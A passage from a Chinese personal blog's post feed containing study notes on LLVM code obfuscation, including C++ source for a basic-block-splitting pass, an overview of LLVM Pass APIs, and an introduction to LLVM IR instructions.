class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/CommandLine.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../include/SplitBasicBlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选的参数，指定一个基本块会被分裂成几个基本块，默认值为 2</span></span><br><span class="line"><span class="function"><span class="type">static</span> cl::opt&lt;<span class="type">int</span>&gt; <span class="title">splitNum</span><span class="params">(<span class="string">&quot;split_num&quot;</span>, cl::init(<span class="number">2</span>), cl::desc(<span class="string">&quot;Split&lt;split_num&gt; time(s) each BB&quot;</span>))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SplitBasicBlock</span> : <span class="keyword">public</span> FunctionPass&#123;</span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">            <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">            <span class="built_in">SplitBasicBlock</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="type">bool</span> <span class="title">containsPHI</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">split</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="comment">// namespace</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// runOnFunction函数实现</span></span><br><span class="line"><span class="type">bool</span> SplitBasicBlock :: <span class="built_in">runOnFunction</span>(Function &amp;F)&#123;</span><br><span class="line">    vector&lt;BasicBlock*&gt; origBB;</span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">        origBB.<span class="built_in">push_back</span>(&amp;BB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(BasicBlock *BB : origBB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">containsPHI</span>(BB))&#123;</span><br><span class="line">            <span class="built_in">split</span>(BB);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SplitBasicBlock::containsPHI</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *BB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;PHINode&gt;(&amp;I))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SplitBasicBlock::split</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> splitSize = (BB-&gt;<span class="built_in">size</span>() + splitNum - <span class="number">1</span>) / splitNum;</span><br><span class="line">    BasicBlock *curBB = BB;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt; splitNum; i++)&#123;</span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : *curBB)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt++ == splitSize)&#123;</span><br><span class="line">                curBB = curBB-&gt;<span class="built_in">splitBasicBlock</span>(&amp;I);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">FunctionPass* <span class="title">createSplitBasicBlockPass</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SplitBasicBlock</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> SplitBasicBlock :: ID = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 注册该 SplitBasicBlock Pass</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;SplitBasicBlock&gt; <span class="title">x</span><span class="params">(<span class="string">&quot;split&quot;</span>, <span class="string">&quot;Split a basic block into multiple basic blocks.&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="SplitBasicBlock-h"><a href="#SplitBasicBlock-h" class="headerlink" title="SplitBasicBlock.h"></a>SplitBasicBlock.h</h3><p>在 llvm 命名空间里添加一个函数<code>FunctionPass* createSplitBasicBlockPass()</code></p><p>这个函数将在<code>SplitBasicBlock.cpp</code>里实现</p><p>这样的话其他 LLVM Pass 就可以通过引入头文件<code>SplicBasicBlock.h</code>调用<code>createSplitBasicBlockPass</code>函数来创建一个<code>SplitBasicBlock</code>Pass，完成基本块的分割</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> llvm&#123;</span><br><span class="line">    <span class="function">FunctionPass* <span class="title">createSplitBasicBlockPass</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>SplitBasicBlock.cpp</code>中实现<code>llvm::createSplitBasicBlock</code>函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FunctionPass* <span class="title">llvm::createSplitBasicBlockPass</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SplitBasicBlock</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _SPLIT_BASIC_BLOCK_H_<span class="comment">// 防止重复导入头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _SPLIT_BASIC_BLOCK_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="keyword">namespace</span> llvm</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">FunctionPass* <span class="title">createSplitBasicBlockPass</span><span class="params">()</span></span>;</span><br><span class="line">&#125; <span class="comment">// namespace llvm</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hack技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码混淆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm代码混淆学习（二）</title>
      <link href="/posts/17054/"/>
      <url>/posts/17054/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>随便学学 llvm 代码混淆，顺便做个毕设，水几篇文章就当做做笔记</p></blockquote><h1 id="LLVM-Pass-常用-API"><a href="#LLVM-Pass-常用-API" class="headerlink" title="LLVM Pass 常用 API"></a>LLVM Pass 常用 API</h1><p>LLVM Pass 框架中，三个最核心的类是 <code>Function</code>、<code>BasicBlock</code>和<code>Instruction</code>，分别对应 LLVM IR 中的函数、基本块和指令，还有一个基本类<code>Value</code>，所有可以被当作指令操作数的类型都是 <code>Value</code> 的子类</p><h2 id="Function-类"><a href="#Function-类" class="headerlink" title="Function 类"></a>Function 类</h2><p>与 Function 有关的操作主要是获取函数的一些属性，比如名称等等，以及对函数中基本块的遍历：</p><ul><li>获取函数名称：F.getName()</li><li>获取入口快：F.getEntryBlock()</li><li>函数中基本块的遍历</li></ul><p>可以通过 foreach 循环对函数 Function 中的每个基本块 BasicBlock 进行遍历</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;<span class="comment">// 使用引用是为了能修改传入参数Function类</span></span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;<span class="comment">// 遍历F中的基本块，同样使用引用</span></span><br><span class="line">        <span class="comment">// to do</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BasicBlock-类"><a href="#BasicBlock-类" class="headerlink" title="BasicBlock 类"></a>BasicBlock 类</h2><p>与 BasicBlcok 有关的操作主要是基本块的克隆、分裂、移动等，以及对基本块中指令的遍历：</p><ul><li>获取基本块名称：BB.getName()</li><li>获取基本块的终结指令：BB.getTerminator()</li><li>基本块的克隆</li><li>基本块的分裂</li><li>基本块的移动</li><li>基本块中指令的遍历</li></ul><p>可以通过 foreach 循环对基本块 BasickBlock 中的每个指令 Instruction 进行遍历</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;<span class="comment">// 使用引用是为了能修改传入参数Function类</span></span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;<span class="comment">// 遍历F中的基本块，同样使用引用</span></span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : BB)&#123;<span class="comment">// 遍历BB中的指令，同样使用引用</span></span><br><span class="line">            <span class="comment">// to do</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Instruction-类"><a href="#Instruction-类" class="headerlink" title="Instruction 类"></a>Instruction 类</h2><p>指令可以有很多种，亦即 Instruction 类可以拥有多个子类，如：BinaryOpterator, AllocaInst, BranchInst 等</p><ul><li>二元运算：BinaryOperator</li><li>内存访问和寻址：<ul><li>Allocalnst</li><li>StoreInst</li><li>LoadInst</li></ul></li><li>分支指令：<ul><li>Branchlnst</li><li>Switchlnst</li></ul></li><li>其他指令<ul><li>Calllnst</li><li>ICmplnst</li><li>PHINode</li></ul></li></ul><p>与 Instruction 有关的操作主要是指令的创建、删除、修改以及指令中操作数的遍历：</p><p>可以通过 for 循环对指令 Instruction 中的每个操作数 Value* 进行遍历</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;<span class="comment">// 使用引用是为了能修改传入参数Function类</span></span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;<span class="comment">// 遍历F中的基本块，同样使用引用</span></span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : BB)&#123;<span class="comment">// 遍历BB中的指令，同样使用引用</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; I.<span class="built_in">getNumOperands</span>(); i++)&#123;</span><br><span class="line">                Value *V = I.<span class="built_in">getOperand</span>(i);</span><br><span class="line">                <span class="comment">// to do</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Value-类"><a href="#Value-类" class="headerlink" title="Value 类"></a>Value 类</h2><p>所有可以被当做<strong>指令操作数</strong>的类型都是 Value 的子类，Value 有以下五种类型的子类</p><ul><li>常量：Constant</li><li>参数：Argument</li><li>指令（运算结果）：Instruction</li><li>函数（指针）：Function</li><li>基本块：BasicBlock</li></ul><h2 id="输出流"><a href="#输出流" class="headerlink" title="输出流"></a>输出流</h2><p>在 C++ 中可以通过 cout, cerr, clog 输出流来进行打印，在 LLVM 中则建议使用 outs(), errs(), dbgs() 三个函数来获取输出流，然后打印</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line"><span class="comment">// 一般信息打印</span></span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">&quot;Function: &quot;</span> &lt;&lt; F.<span class="built_in">getName</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="comment">// 错误信息打印 if something wrong</span></span><br><span class="line">    <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Something wrong.&quot;</span> &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="comment">// 调试信息打印 debug</span></span><br><span class="line">    <span class="built_in">dbgs</span>() &lt;&lt; <span class="string">&quot;Debug&quot;</span> &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="LLVM-部分相关文档"><a href="#LLVM-部分相关文档" class="headerlink" title="LLVM 部分相关文档"></a>LLVM 部分相关文档</h1><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230208005218987.png" alt="image-20230208005218987"></p>]]></content>
      
      
      <categories>
          
          <category> hack技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码混淆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《潜水员戴夫》游戏测评</title>
      <link href="/posts/34623/"/>
      <url>/posts/34623/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>llvm代码混淆学习（一）</title>
      <link href="/posts/53988/"/>
      <url>/posts/53988/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>随便学学 llvm 代码混淆，顺便做个毕设，水几篇文章就当做做笔记</p></blockquote><h1 id="LLVM-IR-概述"><a href="#LLVM-IR-概述" class="headerlink" title="LLVM IR 概述"></a>LLVM IR 概述</h1><ul><li>低级编程语言，类似汇编</li><li>任何高级编程语言都可以用 LLVM IR 表示</li><li>基于 LLVM IR 可以进行代码优化</li></ul><h2 id="两种表示方法"><a href="#两种表示方法" class="headerlink" title="两种表示方法"></a>两种表示方法</h2><ul><li>人类可以阅读的文本形式，文件后缀为<code>.ll</code></li><li>易于机器处理的二进制格式，文件后缀为<code>.bc</code></li></ul><p>用<code>llvm-dis</code>和<code>llvm-as</code>可以相互转化</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230206231754258.png" alt="image-20230206231754258"></p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>源代码被编译为 LLVM IR 后，具有<code>模块 Module</code>，<code>函数 Function</code>和<code>基本块 BasicBlock</code></p><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230206232105298.png" alt="image-20230206232105298"></p><ul><li>一个源代码文件对应一个模块</li><li>头部信息包含程序的目标平台，如 x86、arm 等，和一些其他信息</li><li>全局符号包含<strong>全局变量、函数的定义与声明</strong></li></ul><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230206232217964.png" alt="image-20230206232217964"></p><ul><li>函数指的是源代码中的<strong>某个函数</strong></li><li>参数即函数的<strong>参数</strong></li><li>一个函数由若干<strong>基本块</strong>组成，其中函数最先执行的基本块为<strong>入口块</strong></li></ul><h3 id="基本块"><a href="#基本块" class="headerlink" title="基本块"></a>基本块</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230206232337419.png" alt="image-20230206232337419"></p><ul><li>一个基本块由若干指令和标签组成</li><li>正常情况下，基本块的最后一条指令为跳转指令(<strong>br</strong> 或 <strong>switch</strong>)，或返回指令(<strong>retn</strong>)，也叫作终结指令(Terminator Instruction)</li><li>PHI 指令是一种特殊的指令</li></ul><h2 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h2><p>基于 LLVM 的混淆，通常是以函数或者比函数更小的单位为基本单位进行混淆的，我们通常更关心函数和基本块这两个结构</p><ul><li>以函数为基本单位的混淆：控制流平坦化</li><li>以基本块基本单位的混淆：虚假控制流</li><li>以指令为基本单位的混淆：指令替代</li></ul><h1 id="LLVM-IR-常用指令含义及其用法"><a href="#LLVM-IR-常用指令含义及其用法" class="headerlink" title="LLVM IR 常用指令含义及其用法"></a>LLVM IR 常用指令含义及其用法</h1><h2 id="终结指令-Terminator-Instructions"><a href="#终结指令-Terminator-Instructions" class="headerlink" title="终结指令 Terminator Instructions"></a>终结指令 Terminator Instructions</h2><h3 id="ret-指令"><a href="#ret-指令" class="headerlink" title="ret 指令"></a>ret 指令</h3><ul><li>函数的返回指令，对应 C&#x2F;C++ 中的 return</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ret &lt;type&gt; &lt;value&gt;; 返回特定类型返回值的 return 指令</span><br><span class="line">ret void; 无返回值的 return 指令</span><br><span class="line">例：</span><br><span class="line">ret i32 5; 返回整数 5</span><br><span class="line">ret void; 无返回值</span><br><span class="line">ret &#123; i32, i8 &#125; &#123; i32 4, i8 2 &#125;; 返回一个结构体</span><br></pre></td></tr></table></figure><h3 id="br-指令"><a href="#br-指令" class="headerlink" title="br 指令"></a>br 指令</h3><ul><li>br 是”分支”的英文 branch 的缩写，分为非条件分支和条件分支，对应 C&#x2F;C++ 的 if 语句</li><li>无条件分支类似于x86汇编中的 jmp 指令，条件分支类似于x86汇编中的 jnz, je 等条件跳转指令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">br i1 &lt;cond&gt;, label &lt;iftrue&gt;, label &lt;iffalse&gt;; 条件分支，i1 是条件，1 位整数</span><br><span class="line">br label &lt;dest&gt;; 无条件分支</span><br><span class="line">例：</span><br><span class="line">Test:</span><br><span class="line">%cond = icmp eq i32 %a, %b;</span><br><span class="line">br i1 %cond, label %IfEqual, label %IfUnequal</span><br><span class="line">IfEqual:</span><br><span class="line">ret i32 1</span><br><span class="line">IfUnEqual:</span><br><span class="line">ret i32 0</span><br></pre></td></tr></table></figure><h3 id="swtich-指令"><a href="#swtich-指令" class="headerlink" title="swtich 指令"></a>swtich 指令</h3><ul><li>分支指令，可看做是 br 指令的升级版，支持的分支更多，但使用也更复杂。对应 C&#x2F;C++ 中的 switch</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">switch &lt;intty&gt; &lt;value&gt;, label &lt;defaultdest&gt; [ &lt;intty&gt; &lt;val&gt;, label &lt;dest&gt; ...]</span><br><span class="line">例：</span><br><span class="line">; 与条件跳转等效</span><br><span class="line">%Val = zext i1 %value to i32</span><br><span class="line">switch i32 %Val, label %truedest [ i32 0, label %falsedest ]</span><br><span class="line"></span><br><span class="line">; 与非条件跳转等效</span><br><span class="line">switch i32 0, label %dest [ ]</span><br><span class="line"></span><br><span class="line">; 拥有三个分支的条件跳转</span><br><span class="line">switch i32 %val, label %otherwise [ i32 0, label %onzero</span><br><span class="line">i32 1, label %onone</span><br><span class="line">i32 2, label %ontwo ]</span><br></pre></td></tr></table></figure><h2 id="比较指令-Compere-Instructions"><a href="#比较指令-Compere-Instructions" class="headerlink" title="比较指令 Compere Instructions"></a>比较指令 Compere Instructions</h2><p>常与 br 指令一起使用，如：<code>cmp</code>、<code>switch</code>、<code>test</code></p><h3 id="icmp-指令"><a href="#icmp-指令" class="headerlink" title="icmp 指令"></a>icmp 指令</h3><ul><li><strong>整数或指针</strong>的比较指令</li><li>条件 cond 可以是 eq（相等），ne（不相等），ugt（无符号大于）等等</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = icmp &lt;cond&gt; &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; 比较整数 op1 和 op2 是否满足条件 cond</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = icmp eq i32 4, 5; yields: result=false eq=equal(相等)</span><br><span class="line">&lt;result&gt; = icmp ne float* %X, %X; yields: result=false ne=not equal(不相等)</span><br><span class="line">&lt;result&gt; = icmp ult i16 4, 5; yields: result=true ult=unsigned less than(无符号小于)</span><br><span class="line">&lt;result&gt; = icmp sgt i16 4, 5; yields: result=false sgt=signed greater than(有符号大于)</span><br><span class="line">&lt;result&gt; = icmp ule i16 -4, 5; yields: result=false ule=unsigned less or equal(无符号小于等于)</span><br><span class="line">&lt;result&gt; = icmp sge i16 4, 5; yields: result=false sge=signed greater or equal(有符号大于等于)</span><br></pre></td></tr></table></figure><h3 id="fcmp-指令"><a href="#fcmp-指令" class="headerlink" title="fcmp 指令"></a>fcmp 指令</h3><ul><li><strong>浮点数</strong>的比较指令</li><li>条件 cond 可以是 oeq（ordered and equal）, ueq（unordered or equal）, false（必定不成立）等等</li><li>ordered 的意思是，两个操作数都不能为 <strong>NAN</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = fcmp &lt;cond&gt; &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; 比较浮点数 op1 和 op2 是否满足条件 cond</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = fcmp oeq float 4.0, 5.0; yields: result = false</span><br><span class="line">&lt;result&gt; = fcmp one float 4.0, 5.0; yields: result = true</span><br><span class="line">&lt;result&gt; = fcmp olt float 4.0, 5.0; yields: result = true</span><br><span class="line">&lt;result&gt; = fcmp ueq double 1.0, 2.0; yields: result = false</span><br></pre></td></tr></table></figure><h2 id="二元运算-Binary-Operations"><a href="#二元运算-Binary-Operations" class="headerlink" title="二元运算 Binary Operations"></a>二元运算 Binary Operations</h2><h3 id="add-指令"><a href="#add-指令" class="headerlink" title="add 指令"></a>add 指令</h3><ul><li><strong>整数</strong>加法指令，对应 C&#x2F;C++ 中的“+”操作符，类似x86汇编中的 add 指令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = add &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = add i32 4, %var; yields i32:result = 4 + %var</span><br></pre></td></tr></table></figure><h3 id="sub-指令"><a href="#sub-指令" class="headerlink" title="sub 指令"></a>sub 指令</h3><ul><li><strong>整数</strong>减法指令，对应 C&#x2F;C++ 中的“-”操作符，类似x86汇编中的 sub 指令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = sub &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = sub i32 4, %var; yields i32:result = 4 - %var</span><br><span class="line">&lt;result&gt; = sub i32 0, %var; yields i32:result = -%var</span><br></pre></td></tr></table></figure><h3 id="mul-指令"><a href="#mul-指令" class="headerlink" title="mul 指令"></a>mul 指令</h3><ul><li><strong>整数</strong>乘法指令，对应 C&#x2F;C++ 中的“*”操作符，类似x86汇编中的 mul 指令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = mul &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = mul i32 4, %var; yields i32:result = 4 * %var</span><br></pre></td></tr></table></figure><h3 id="udiv-指令"><a href="#udiv-指令" class="headerlink" title="udiv 指令"></a>udiv 指令</h3><ul><li><strong>无符号整数</strong>除法指令，对应 C&#x2F;C++ 中的“&#x2F;”操作符。如果存在exact关键字，且op1不是op2的倍数，就会出现错误</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = udiv &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">&lt;result&gt; = udiv exact &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = udiv i32 4, %var; yields i32:result = 4 / %var</span><br></pre></td></tr></table></figure><h3 id="sdiv-指令"><a href="#sdiv-指令" class="headerlink" title="sdiv 指令"></a>sdiv 指令</h3><ul><li><strong>有符号整数</strong>除法指令，对应 C&#x2F;C++ 中的“&#x2F;”操作符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = sdiv &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">&lt;result&gt; = sdiv exact &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = sdiv i32 4, %var; yields i32:result = 4 / %var</span><br></pre></td></tr></table></figure><h3 id="urem-指令"><a href="#urem-指令" class="headerlink" title="urem 指令"></a>urem 指令</h3><ul><li><strong>无符号整数</strong>取余指令，对应 C&#x2F;C++ 中的“%”操作符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = urem &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = urem i32 4, %var; yields i32:result = 4 % %var</span><br></pre></td></tr></table></figure><h3 id="srem-指令"><a href="#srem-指令" class="headerlink" title="srem 指令"></a>srem 指令</h3><ul><li><strong>有符号整数</strong>取余指令，对应 C&#x2F;C++ 中的“%”操作符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = srem &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = srem i32 4, %var; yields i32:result = 4 % %var</span><br></pre></td></tr></table></figure><h2 id="按位二元运算-Bitwise-Binary-Operations"><a href="#按位二元运算-Bitwise-Binary-Operations" class="headerlink" title="按位二元运算 Bitwise Binary Operations"></a>按位二元运算 Bitwise Binary Operations</h2><h3 id="shl-指令"><a href="#shl-指令" 